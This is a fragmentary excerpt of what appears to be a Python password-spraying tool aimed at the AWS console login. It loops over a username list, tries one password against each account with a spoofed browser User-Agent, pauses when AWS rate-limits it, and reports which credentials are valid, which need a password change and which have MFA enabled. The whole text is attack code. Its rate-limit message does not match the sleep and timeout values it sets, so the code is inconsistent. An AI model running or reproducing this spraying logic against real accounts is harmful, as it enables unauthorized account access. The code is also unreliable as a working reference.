...
def spray(args):
    ...
    with open(args.read) as input_usernames:
        for line in input_usernames:
            ...
            headers = {
                "User-Agent": "Mozilla/5.0 (Windows; Windows NT 10.2; Win64; x64) AppleWebKit/533.50 (KHTML, like Gecko) Chrome/49.0.2181.363 Safari/601.3 Edge/15.29600",
            ...
            data = {
                ...
                "redirect_uri": "https://console.aws.amazon.com",
            ...
            try:
                ...
                print(
                    "AWS is rate limiting attempts most likely. Pausing for 30 seconds and adding a 5 second timeout between attempts."
                )
                time.sleep(20)
                timeout = 10
            usercreds = f"{username}:{args.password}"
            if "SUCCESS" in response_data.get(
                "state"
            ) and "CHANGE_PASSWORD" in response_data.get("properties").get("result"):
                ...
                "SUCCESS" in response_data.get("state")
                and "CHANGE_PASSWORD"
                not in response_data.get("properties", {}).get("result")
                and "MFA" not in response_data.get("properties", {}).get("result")
            ):
                found_creds = found_creds + 1
                ...
                "SUCCESS" in response_data.get("state")
                and "MFA" in response_data.get("properties", {}).get("result")
                and "CHANGE_PASSWORD"
                not in response_data.get("properties", {}).get("result")
            ):
                found_creds = found_creds + 1
                print(f"[+]Valid Credentials Found but MFA ENABLED - {usercreds}")
                continue_check = input("Do you want to continue? (y/n) ")
                if continue_check.lower() == "y":
                    continue
                else:
